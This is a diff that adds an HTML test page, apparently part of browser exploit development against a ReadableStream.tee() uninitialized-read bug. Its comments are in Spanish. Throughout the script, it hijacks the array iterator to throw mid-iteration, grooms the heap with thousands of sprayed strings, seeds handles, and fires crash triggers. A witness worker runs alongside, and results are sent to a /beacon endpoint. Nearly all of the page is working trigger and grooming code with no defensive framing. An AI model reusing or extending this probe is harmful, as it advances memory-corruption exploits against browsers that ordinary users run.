@@ -1,0 +1,94 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<title>FA-v21-tk WHICH-WORLD — press-16: matriz del un-init read (diseño G53 §6-P1)</title></head>
+<body><pre id="out">FA-v21-tk WHICH-WORLD…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v21-tk "WHICH-WORLD" — press-16 (GEOHOT-G53 §6-P1, verbatim).
+ * Re-clasificación: press-11 = UN-INIT HandleSlot READ — forEachInIterable
+ * traga el throw y devuelve el Vector TRUNCADO (IteratorOperations.h:137-141);
+ * ASSERT(size==2) no-op; InternalReadableStream.cpp:195 derefa slots crudos.
+ * S2/S3 miden QUÉ BYTES sirve el allocator (fresh-zero vs sembrados).
+ * ORDEN: lo letal AL FINAL. "armed-N" antes de cada trigger. Worker testigo
+ * (VM propia) discrimina state-kill vs proceso-segv. WK-Z terminal a 12s.
+ * Riesgo tolerado ×3: S4 (y S2/S3 si falla el groom) matan el hilo main. */
+var RID="v21t"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V21T-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+/* S0 — L + DR-gate + gates de ventana */
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v21-tk; dr="+dr+"; rt="+rt+"; W="+(typeof Worker)+"; RBC="+(typeof ReadableByteStreamController)+"; BYOB="+(typeof ReadableStreamBYOBReader));
+
+/* Worker testigo: HB propio + W1 gates + W2 self-trigger + WK-Z a 12s */
+var wkSpawn="-";
+try{
+  var wsrc =
+    "var HB=setInterval(function(){try{fetch('/beacon/V21T-WKHB?x='+Date.now(),{method:'POST',body:'{}'}).catch(function(){});}catch(e){}},2000);\n"+
+    "var g='W1: RBC='+(typeof ReadableByteStreamController)+';BYOB='+(typeof ReadableStreamBYOBReader)+';transfer='+(typeof ArrayBuffer.prototype.transfer)+';resize='+(typeof ArrayBuffer.prototype.resize);\n"+
+    "try{fetch('/beacon/V21T-W1',{method:'POST',body:JSON.stringify({b:g})}).catch(function(){});}catch(e){}\n"+
+    "setTimeout(function(){\n"+
+    "  var r='pre-W2';\n"+
+    "  try{fetch('/beacon/V21T-W2ARM',{method:'POST',body:JSON.stringify({b:r})}).catch(function(){});}catch(e){}\n"+
+    "  try{ Array.prototype[Symbol.iterator]=function(){var i=0;return{next:function(){i++;if(i>1)throw new Error('WKILL');return{value:undefined,done:false};}};};\n"+
+    "       new ReadableStream({}).tee(); r='W2-SURVIVED'; }catch(e){ r='W2-caught:'+String((e&&e.message)||e).slice(0,40); }\n"+
+    "  try{fetch('/beacon/V21T-W2',{method:'POST',body:JSON.stringify({b:r})}).catch(function(){});}catch(e){}\n"+
+    "},6000);\n"+
+    "setTimeout(function(){try{fetch('/beacon/V21T-WKZ',{method:'POST',body:JSON.stringify({b:'worker terminal 12s — vivo'})}).catch(function(){});}catch(e){}},12000);\n";
+  var w=new Worker(URL.createObjectURL(new Blob([wsrc],{type:"text/javascript"})));
+  wkSpawn="ok";
+}catch(e){ wkSpawn="E:"+String((e&&e.message)||e).slice(0,40); }
+bk("WK","worker="+wkSpawn);
+
+/* helpers */
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+/* full-fill-then-throw: rinde los 2 reales, LUEGO tira (size==2, sin un-init) */
+function poiFullFillThenThrow(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i<=t.length) return {value:t[i-1],done:false}; throw new Error("KILL-MARK"); }};}; }
+/* throw-at-1: rinde this[0] UNA vez, tira en next#2 (size==1 → results[1] CRUDO) */
+function poiThrowAt1(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i===1) return {value:t[0],done:false}; throw new Error("KILL-MARK"); }};}; }
+/* baseline press-11: yield undefined + throw en next#2 */
+function poiBaseline(){ Array.prototype[Symbol.iterator]=function(){ var i=0; return { next:function(){ i++; if(i>1) throw new Error("KILL-MARK"); return {value:undefined,done:false}; }};}; }
+/* drain class-128: strings ~104 chars (StringImpl ~120B), HOLD */
+var HOLD=[];
+function drain(n){ for(var i=0;i<n;i++){ HOLD.push(new Array(105).join("x")+i); } }
+
+/* S1 — CONTROL: full-fill-then-throw (0-crash esperado: size==2, ASSERT cumple) */
+bk("armed-1","control full-fill-then-throw");
+var s1="-";
+try{ poiFullFillThenThrow(); new ReadableStream({}).tee(); s1="no-throw"; rst(); }
+catch(e){ rst(); s1="threw:"+String((e&&e.message)||e).slice(0,40); }
+bk("S1",s1+" (pred: threw:KILL-MARK catchable, viva)");
+
+/* S2 — DRAIN + throw-at-1 (¿el chunk viene fresh-zero? → sobrevive) */
+bk("armed-2","drain x4096 + throw-at-1");
+var s2="-";
+try{ drain(4096); }catch(e){}
+try{ poiThrowAt1(); new ReadableStream({}).tee(); s2="no-throw"; rst(); }
+catch(e){ rst(); s2="threw:"+String((e&&e.message)||e).slice(0,40); }
+bk("S2",s2+" (pred: catchable si drain satura; muerte=freelist honda)");
+
+/* S3 — DRAIN + SEED (tee#1 limpio siembra handles reales) + throw-at-1 back-to-back */
+bk("armed-3","drain+seed(tee limpio)+throw-at-1");
+var s3="-";
+try{ rst(); var seed=new ReadableStream({}).tee(); seed=null; }catch(e){}
+try{ poiThrowAt1(); new ReadableStream({}).tee(); s3="no-throw"; rst(); }
+catch(e){ rst(); s3="threw:"+String((e&&e.message)||e).slice(0,40); }
+bk("S3",s3+" (pred: catchable; muerte=scan sirve linea ajena)");
+
+/* S4 — BASELINE letal (press-11 exacto) — ÚLTIMA SIEMPRE */
+bk("armed-4","baseline letal (press-11) — si no hay S4-survivor, murio aqui");
+var s4="-";
+try{ poiBaseline(); new ReadableStream({}).tee(); s4="no-throw"; rst(); }
+catch(e){ rst(); s4="threw:"+String((e&&e.message)||e).slice(0,40); }
+bk("S4-survivor",s4);
+
+rst();
+clearInterval(HB);
+bk("Z","FA-v21-tk WHICH-WORLD complete — main VIVA (mundo NO-letal)");
+})();
+</script></body></html>
